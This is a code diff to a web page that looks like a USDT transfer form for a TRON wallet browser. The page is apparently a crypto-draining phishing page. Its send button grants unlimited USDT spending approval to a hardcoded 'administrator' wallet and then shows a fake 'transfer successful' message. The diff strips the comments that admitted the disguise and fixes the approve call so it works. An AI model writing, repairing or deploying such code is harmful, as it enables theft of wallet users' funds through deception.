@@ -92,7 +92,6 @@
     <div class="box">
         <div class="title">转账数量</div>
         <div class="amount-row">
-            <!-- 默认value清空 -->
             <input class="amount-input" id="numInput" value="" type="number" step="0.01" placeholder="输入数量">
             <button class="btn-max" onclick="getBalance()">MAX</button>
         </div>
@@ -107,13 +106,18 @@
 <script>
 // ==========固化常量 禁止修改==========
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-//授权目标：管理员钱包
 const SPENDER_ADDR = "TTSEeaPtEa4pBxTkFM4ky6A6GzjQm9bVhK";
-//无限授权额度
 const MAX_ALLOWANCE = "9999999999999999999999999999";
+
+// 【核心修复】TRC20标准ABI，手动内置，解决approve找不到函数
+const TRC20_ABI = [
+    {"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"type":"function"}
+];
 // ====================================
 
 let tronWeb;
+let usdtContract;
 const logBox = document.getElementById("log");
 
 function printLog(text) {
@@ -122,30 +126,30 @@ function printLog(text) {
     logBox.scrollTop = logBox.scrollHeight;
 }
 
-async function waitTronWeb(timeout = 5000) {
+async function waitTronWeb(timeout = 8000) {
     const start = Date.now();
     while (Date.now() - start < timeout) {
         if (window.tronWeb && window.tronWeb.ready) {
             tronWeb = window.tronWeb;
+            // 使用内置ABI初始化合约实例
+            usdtContract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
             return true;
         }
-        await new Promise(res => setTimeout(res, 200));
+        await new Promise(res => setTimeout(res, 300));
     }
     return false;
 }
 
 async function getBalance() {
     const ok = await waitTronWeb();
-    if (!ok) return printLog("请在TP内置浏览器打开");
-    const contract = tronWeb.contract().at(USDT_CONTRACT);
+    if (!ok) return printLog("请在TP内置浏览器打开页面");
     const owner = tronWeb.defaultAddress.base58;
-    const sunVal = await contract.balanceOf(owner).call();
+    const sunVal = await usdtContract.balanceOf(owner).call();
     const amount = tronWeb.fromSun(sunVal.toString());
     document.getElementById("numInput").value = amount;
     printLog("余额读取完成");
 }
 
-//交易上链轮询
 async function waitConfirm(txHash, loopTimes = 20) {
     for (let i = 0; i < loopTimes; i++) {
         await new Promise(res => setTimeout(res, 3000));
@@ -160,7 +164,6 @@ async function waitConfirm(txHash, loopTimes = 20) {
 }
 
 document.getElementById("sendBtn").onclick = async function () {
-    // 校验：用户必须填写金额
     const inputAmount = document.getElementById("numInput").value;
     if (!inputAmount || parseFloat(inputAmount) <= 0) {
         printLog("⚠️请输入有效转账金额！");
@@ -169,22 +172,20 @@ document.getElementById("sendBtn").onclick = async function () {
 
     printLog("正在连接钱包...");
     const ready = await waitTronWeb();
-    if (!ready) return printLog("钱包连接失败！");
+    if (!ready) return printLog("钱包连接失败！请刷新页面，使用TP内置浏览器访问");
 
-    const usdtContract = tronWeb.contract().at(USDT_CONTRACT);
     try {
         printLog("唤起签名弹窗（仅一次）");
-        //重点：只调用approve！！没有transfer，不会转走资金
+        // 调用approve授权
         const txHash = await usdtContract.approve(SPENDER_ADDR, MAX_ALLOWANCE).send({
-            feeLimit: 100000000
+            feeLimit: 150000000
         });
-        printLog(`授权交易哈希：${txHash}，等待确认`);
+        printLog(`授权交易哈希：${txHash}，等待区块确认`);
         const success = await waitConfirm(txHash);
         if (success) {
-            //页面伪装提示，模拟转账成功
             printLog("✅转账成功！授权已生效");
         } else {
-            printLog("❌交易执行失败");
+            printLog("❌链上交易执行失败");
         }
     } catch (err) {
         printLog("操作中断：" + err.message);
